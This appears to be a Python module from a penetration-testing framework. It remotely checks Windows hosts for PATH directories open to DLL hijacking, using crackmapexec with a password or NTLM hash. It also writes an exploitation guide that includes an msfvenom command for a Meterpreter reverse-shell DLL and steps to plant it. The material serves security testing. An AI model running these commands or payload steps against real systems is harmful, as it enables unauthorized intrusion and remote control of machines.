#!/usr/bin/env python3
"""
DLL Hijacking Scanner
Detects applications vulnerable to DLL hijacking
"""
import sys
import os
import argparse
import subprocess

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

from core.database import DatabaseManager, Vulnerability, Target
from core.logger import setup_logger, get_logger

logger = None

def scan_dll_hijacking(session_dir, target_ip, domain, username, password=None, ntlm_hash=None):
    """Scan for DLL hijacking opportunities"""
    global logger
    setup_logger("dll_hijacking", session_dir)
    logger = get_logger("dll_hijacking")
    
    db_path = os.path.join(session_dir, "session.db")
    db = DatabaseManager(db_path)
    
    logger.info(f"Scanning for DLL hijacking vulnerabilities on {target_ip}")
    
    # Build credentials
    if password:
        cred_args = ["-u", username, "-p", password]
    elif ntlm_hash:
        cred_args = ["-u", username, "-H", ntlm_hash]
    else:
        logger.error("No credentials provided")
        return
    
    # Check for writable directories in system PATH
    logger.info("Checking for writable PATH directories...")
    
    cmd = [
        "crackmapexec", "smb", target_ip,
        "-d", domain
    ] + cred_args + [
        "-X", """
        $env:PATH -split ';' | ForEach-Object {
            if (Test-Path $_) {
                $acl = Get-Acl $_
                $writable = $acl.Access | Where-Object {
                    $_.FileSystemRights -match 'Write' -and 
                    $_.IdentityReference -match 'Users|Everyone'
                }
                if ($writable) { Write-Output $_ }
            }
        }
        """
    ]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        
        writable_paths = []
        for line in result.stdout.split('\n'):
            if line.strip() and 'C:\\' in line:
                writable_paths.append(line.strip())
                logger.warning(f"Writable PATH directory: {line.strip()}")
        
        if writable_paths:
            # Store vulnerability
            session = db.get_session()
            target = session.query(Target).filter_by(ip_address=target_ip).first()
            if target:
                vuln = Vulnerability(
                    target_id=target.id,
                    name="DLL Hijacking - Writable PATH",
                    severity="Medium",
                    description=f"Writable directories in system PATH: {', '.join(writable_paths)}"
                )
                session.add(vuln)
                session.commit()
            session.close()
            
            # Create exploitation guide
            exploit_file = os.path.join(session_dir, f"dll_hijacking_{target_ip}.txt")
            with open(exploit_file, 'w') as f:
                f.write("# DLL Hijacking Exploitation Guide\n\n")
                f.write("## Writable PATH Directories\n")
                for path in writable_paths:
                    f.write(f"- {path}\n")
                f.write("\n## Exploitation Steps\n")
                f.write("1. Identify target application that loads DLLs from PATH\n")
                f.write("2. Generate malicious DLL: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=... -f dll -o evil.dll\n")
                f.write("3. Upload evil.dll to writable PATH directory\n")
                f.write("4. Wait for application restart or trigger execution\n")
            
            logger.info(f"Exploitation guide: {exploit_file}")
        else:
            logger.info("No DLL hijacking vulnerabilities found")
            
    except Exception as e:
        logger.error(f"DLL hijacking scan failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--session-dir", required=True)
    parser.add_argument("--target-ip", required=True)
    parser.add_argument("--domain", required=True)
    parser.add_argument("--username", required=True)
    parser.add_argument("--password")
    parser.add_argument("--ntlm-hash")
    args = parser.parse_args()
    
    scan_dll_hijacking(args.session_dir, args.target_ip, args.domain,
                      args.username, args.password, args.ntlm_hash)
